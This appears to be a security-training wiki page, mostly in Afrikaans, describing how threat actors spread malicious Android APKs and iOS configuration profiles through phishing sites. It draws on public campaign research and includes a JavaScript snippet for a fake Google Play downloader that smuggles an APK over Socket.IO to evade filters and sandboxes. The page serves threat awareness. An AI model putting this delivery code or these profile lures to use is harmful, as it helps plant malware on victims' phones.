# Mobile Phishing & Malicious App Distribution (Android & iOS)

> [!INFO]
> Hierdie bladsy dek tegnieke wat deur threat actors gebruik word om **malicious Android APKs** en **iOS mobile-configuration profiles** deur phishing (SEO, social engineering, fake stores, dating apps, ens.) te versprei.
> Die materiaal is aangepas uit die SarangTrap-campaign wat deur Zimperium zLabs (2025) blootgelê is, asook ander openbare navorsing.<sup>[[1]](#references)</sup>

## Aanvalsvloei

1. **SEO/Phishing Infrastructure**
* Registreer dosyne look-alike domains (dating, cloud share, car service…).
– Gebruik plaaslike taal-sleutelwoorde en emojis in die `<title>`-element om in Google te ranglys.
– Host *beide* Android (`.apk`)- en iOS-install instructions op dieselfde landing page.
2. **First Stage Download**
* Android: direkte skakel na ’n *unsigned* of “third-party store”-APK.
* iOS: `itms-services://`- of gewone HTTPS-skakel na ’n malicious **mobileconfig**-profiel (sien hieronder).
3. **Android Post-install Behaviour**
* C2-gated execution, permission abuse, dropper bypasses, background collection en ander post-install malware behaviour word op die toegewyde Android Malware Post-Exploitation-bladsy hieronder gedek.
4. **iOS Delivery Technique**
* ’n Enkele **mobile-configuration profile** kan `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, ens. versoek om die toestel by “MDM”-agtige supervision in te skryf.
* Social-engineering instructions:
1. Maak Settings ➜ *Profile downloaded* oop.
2. Tik drie keer op *Install* (screenshots op die phishing page).
3. Trust die unsigned profile ➜ die attacker verkry *Contacts*- en *Photo*-entitlement sonder App Store-review.
5. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed`-payloads kan ’n phishing-URL **aan die Home Screen vaspen** met ’n branded icon/label.
* Web Clips kan **full-screen** loop (versteek die browser UI) en as **non-removable** gemerk word, wat die victim dwing om die profile te delete om die icon te verwyder.<sup>[[3]](#references)</sup>
6. **Network Layer**
* Gewone HTTP, dikwels op port 80 met ’n HOST-header soos `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (geen TLS → maklik om raak te sien).

## Android Malware Post-Exploitation

Vir post-install Android-malware tradecraft soos C2, Accessibility abuse, overlays, ATS automation, staged DEX loading, premium SMS en persistence, sien:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers vervang toenemend statiese APK-skakels met ’n Socket.IO/WebSocket-kanaal wat in Google Play-agtige lures ingebed is. Dit verberg die payload-URL, omseil URL-/extension-filters en behou ’n realistiese install UX.<sup>[[2]](#references)[[4]](#references)</sup>

Tipiese client flow wat in die praktyk waargeneem is:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Waarom dit eenvoudige kontroles omseil:
- Geen statiese APK-URL word blootgestel nie; die payload word in die geheue uit WebSocket-rame gerekonstrueer.
- URL-/MIME-/uitbreidingsfilters wat direkte .apk-antwoorde blokkeer, kan binêre data wat via WebSockets/Socket.IO getonnel word, mis.
- Crawlers en URL-sandboxes wat nie WebSockets uitvoer nie, sal nie die payload ophaal nie.

Sien ook WebSocket tradecraft en tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [The Dark Side of Romance: SarangTrap-afpersingsveldtog](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Web Clips-payloadinstellings vir Apple-toestelle](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker-Trojan wat Indonesiese en Viëtnamese Android-gebruikers teiken](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
